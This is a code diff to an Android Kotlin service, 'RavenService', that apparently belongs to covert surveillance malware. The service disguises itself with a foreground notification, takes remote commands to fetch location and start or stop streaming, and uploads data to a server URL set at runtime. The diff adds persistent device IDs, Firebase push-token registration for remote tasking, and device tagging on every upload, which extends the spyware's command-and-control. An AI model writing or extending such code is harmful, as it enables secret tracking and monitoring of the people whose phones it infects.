@@ -32,13 +32,20 @@ class RavenService : Service() {
         // 1. Disguise immediately
         startForeground(1337, createDisguiseNotification())
 
+        // 2. Ensure Device ID exists
+        val deviceId = getDeviceId()
+
         val command = intent?.action
         Log.d("Raven", "Command received: $command")
 
-        // 2. Execute Command
+        // 3. Execute Command
         when (command) {
             "GET_LOCATION" -> fetchLocation()
             "PING" -> sendPing()
+            "REGISTER_FCM" -> {
+                val token = intent.getStringExtra("token")
+                if (token != null) uploadFcmToken(token)
+            }
             "START_STREAM" -> startStreamingSession()
             "STOP_STREAM" -> stopStreamingSession()
             "SET_REMOTE_DESC" -> handleRemoteAnswer(intent)
@@ -53,6 +60,41 @@ class RavenService : Service() {
         }
 
         return START_NOT_STICKY
+    }
+
+    private fun getDeviceId(): String {
+        val prefs = getSharedPreferences("raven_prefs", Context.MODE_PRIVATE)
+        var id = prefs.getString("device_id", null)
+        if (id == null) {
+            id = java.util.UUID.randomUUID().toString()
+            prefs.edit().putString("device_id", id).apply()
+        }
+        return id!!
+    }
+
+    private fun uploadFcmToken(token: String) {
+        val json = JSONObject()
+        json.put("type", "registration")
+        json.put("fcmToken", token)
+        // Battery Level
+        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
+        val batLevel = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+        json.put("batteryLevel", batLevel)
+        
+        uploadData(json.toString())
+        stopSelf()
+    }
+
+    private fun sendPing() {
+        val json = JSONObject()
+        json.put("type", "ping")
+        // Battery Level
+        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
+        val batLevel = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+        json.put("batteryLevel", batLevel)
+        
+        uploadData(json.toString())
+        stopSelf()
     }
 
     // =================================================================
@@ -131,7 +173,7 @@ class RavenService : Service() {
         serviceScope.launch {
             try {
                 // DYNAMIC CONFIG: Fetch URL from storage, not hardcoded file
-                val currentUrl = ConfigManager.getServerUrl(this@RavenService)
+                val currentUrl = ConfigManager.getServerUrl(this@RavenService) + "/upload"
                 val url = URL(currentUrl)
                 
                 val conn = url.openConnection() as HttpURLConnection
@@ -141,8 +183,12 @@ class RavenService : Service() {
                 conn.doOutput = true
                 conn.doInput = true
 
+                // Inject Device ID into the JSON before sending
+                val finalJson = JSONObject(jsonData)
+                finalJson.put("deviceId", getDeviceId())
+
                 val os = OutputStreamWriter(conn.outputStream)
-                os.write(jsonData)
+                os.write(finalJson.toString())
                 os.flush()
                 os.close()
 
